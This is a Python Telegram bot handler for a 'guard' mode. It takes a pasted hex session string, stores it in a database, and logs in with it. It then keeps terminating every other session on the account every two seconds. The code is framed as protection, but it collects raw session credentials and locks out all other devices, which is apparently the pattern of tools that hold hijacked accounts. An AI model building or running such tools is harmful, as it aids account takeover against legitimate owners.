import asyncio
import logging

from telegram import Update
from telegram.ext import (
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
)

from config import API_ID, API_HASH
from database.models import save_account
from keyboards.inline import guard_kb, guard_back_kb, cancel_kb, main_menu_kb
from utils.helpers import get_devices, check_spam_status, format_account_info, terminate_device
from utils.session_utils import verify_and_get_client

logger = logging.getLogger(__name__)

WAITING_GUARD_HEX = range(1)


# ═══════════════════════════════════════════════════════════════════════════
#  ENTRY
# ═══════════════════════════════════════════════════════════════════════════

async def guard_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🛡️ **Safe / Guard Account**\n\n"
        "Guard mode **monitors** your account and:\n"
        "├─ Keeps your session alive\n"
        "├─ **Auto-terminates** any new login within 2 seconds\n"
        "└─ Notifies you of every attempt\n\n"
        "Send your **hex session string** to activate.\n"
        "_The bot will probe DCs 5→4→3→2→1._",
        parse_mode="Markdown",
        reply_markup=cancel_kb("guard"),
    )
    return WAITING_GUARD_HEX


# ═══════════════════════════════════════════════════════════════════════════
#  RECEIVE HEX — start guard
# ═══════════════════════════════════════════════════════════════════════════

async def receive_guard_hex(update: Update, context: ContextTypes.DEFAULT_TYPE):
    hex_string = update.message.text.strip()
    user_id = update.effective_user.id

    status_msg = await update.message.reply_text("🔄 Activating Guard Mode...")

    client, info = await verify_and_get_client(hex_string, API_ID, API_HASH)
    if client is None:
        await status_msg.edit_text(f"❌ {info}", reply_markup=cancel_kb("guard"))
        return WAITING_GUARD_HEX

    try:
        me = await client.get_me()
        devices = await get_devices(client)
        spam_status = await check_spam_status(client)

        name = f"{info.get('first_name', '')} {info.get('last_name', '')}".strip()
        await save_account(
            owner_id=user_id,
            hex_key=hex_string,
            phone=info.get("phone", "Unknown"),
            name=name or "Unknown",
            user_id=info.get("id", 0),
            dc_id=info.get("dc_id", 0),
            session_string=info.get("session_string", ""),
        )

        # Kill all non-current sessions immediately
        killed = 0
        for dev in devices:
            if not dev.get("current"):
                if await terminate_device(client, dev["hash"]):
                    killed += 1

        # Store guard reference — use bot_data so it survives
        guard_id = f"guard::{user_id}::{me.id}"
        context.application.bot_data[guard_id] = {
            "client": client,
            "active": True,
            "user_id": user_id,
            "chat_id": update.effective_chat.id,
        }
        context.user_data["guard_id"] = guard_id

        info_text = format_account_info(info)
        info_text += (
            f"\n🛡️ **GUARD MODE ACTIVE**\n\n"
            f"├─ Sessions terminated: {killed}\n"
            f"├─ Spam: {spam_status}\n"
            f"├─ Checking every 2s\n"
            f"└─ Status: ✅ **Monitoring**\n\n"
            f"_Any new login will be terminated within 2s._"
        )

        await status_msg.edit_text(info_text, parse_mode="Markdown", reply_markup=guard_back_kb())

        # Start guard task
        asyncio.create_task(_guard_loop(context.application, guard_id))
        return ConversationHandler.END

    except Exception as e:
        if client.is_connected():
            await client.disconnect()
        await status_msg.edit_text(f"❌ Error: {e}", reply_markup=cancel_kb("guard"))
        return WAITING_GUARD_HEX


# ═══════════════════════════════════════════════════════════════════════════
#  BACKGROUND LOOP
# ═══════════════════════════════════════════════════════════════════════════

async def _guard_loop(app, guard_id: str):
    """Check every 2 seconds for unauthorised sessions and terminate them."""
    logger.info(f"Guard loop started: {guard_id}")

    while True:
        try:
            guard = app.bot_data.get(guard_id)
            if not guard or not guard.get("active"):
                logger.info(f"Guard deactivated: {guard_id}")
                break

            client = guard.get("client")
            if not client:
                logger.warning(f"Guard {guard_id}: no client")
                break

            # Reconnect if disconnected
            if not client.is_connected():
                try:
                    await client.connect()
                    if not await client.is_user_authorized():
                        logger.warning(f"Guard {guard_id}: session expired")
                        break
                except Exception as e:
                    logger.warning(f"Guard {guard_id}: reconnect failed: {e}")
                    await asyncio.sleep(2)
                    continue

            # Get devices and kill non-current
            devices = await get_devices(client)
            for dev in devices:
                if not dev.get("current"):
                    await terminate_device(client, dev["hash"])

                    # Notify user
                    try:
                        device_info = (
                            f"🚨 **Unauthorized Login Terminated!** 🚨\n\n"
                            f"📱 Session killed immediately:\n"
                            f"├─ Model: {dev.get('device_model', 'Unknown')}\n"
                            f"├─ Platform: {dev.get('platform', 'Unknown')}\n"
                            f"├─ IP: {dev.get('ip', '')}\n"
                            f"├─ Region: {dev.get('region', '')}\n"
                            f"├─ App: {dev.get('app_name', '')}\n"
                            f"└─ Action: ✅ **Terminated**"
                        )
                        await app.bot.send_message(
                            chat_id=guard["chat_id"],
                            text=device_info,
                            parse_mode="Markdown",
                        )
                    except Exception as notify_err:
                        logger.warning(f"Guard notify failed: {notify_err}")

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Guard loop error: {e}")

        await asyncio.sleep(2)

    # Cleanup
    guard = app.bot_data.get(guard_id)
    if guard:
        client = guard.get("client")
        if client and client.is_connected():
            try:
                await client.disconnect()
            except Exception:
                pass
        app.bot_data.pop(guard_id, None)

    logger.info(f"Guard loop ended: {guard_id}")


# ═══════════════════════════════════════════════════════════════════════════
#  DEACTIVATE
# ═══════════════════════════════════════════════════════════════════════════

async def guard_deactivate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop guard mode from the context menu."""
    query = update.callback_query
    if query:
        await query.answer()
    user_id = update.effective_user.id

    guard_id = context.user_data.get("guard_id")
    if not guard_id:
        # Search bot_data for this user's guard
        for key in list(context.application.bot_data.keys()):
            if key.startswith(f"guard::{user_id}::"):
                guard_id = key
                break

    if guard_id:
        guard = context.application.bot_data.get(guard_id)
        if guard:
            guard["active"] = False  # Signal loop to stop
        context.application.bot_data.pop(guard_id, None)

    context.user_data.pop("guard_id", None)

    msg = "🛡️ **Guard mode deactivated.**\n\nAll monitoring stopped."
    if query:
        await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=main_menu_kb())
    else:
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_menu_kb())
    return ConversationHandler.END


async def cancel_guard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel guard setup."""
    query = update.callback_query
    if query:
        await query.answer()
    from handlers.start import WELCOME_TEXT
    if query:
        await query.edit_message_text(WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())
    else:
        await update.message.reply_text(WELCOME_TEXT, parse_mode="Markdown", reply_markup=main_menu_kb())
    return ConversationHandler.END


# ═══════════════════════════════════════════════════════════════════════════
#  REGISTRATION
# ═══════════════════════════════════════════════════════════════════════════

def get_guard_conversation_handler():
    return ConversationHandler(
        entry_points=[CallbackQueryHandler(guard_entry, pattern="^guard_account$")],
        states={
            WAITING_GUARD_HEX: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_guard_hex),
                CallbackQueryHandler(cancel_guard, pattern="^cancel_guard$"),
            ],
        },
        fallbacks=[
            CallbackQueryHandler(guard_deactivate, pattern="^back_main$"),
            CallbackQueryHandler(cancel_guard, pattern="^cancel_"),
        ],
        name="guard_account",
        persistent=False,
    )


def register(application):
    application.add_handler(get_guard_conversation_handler())
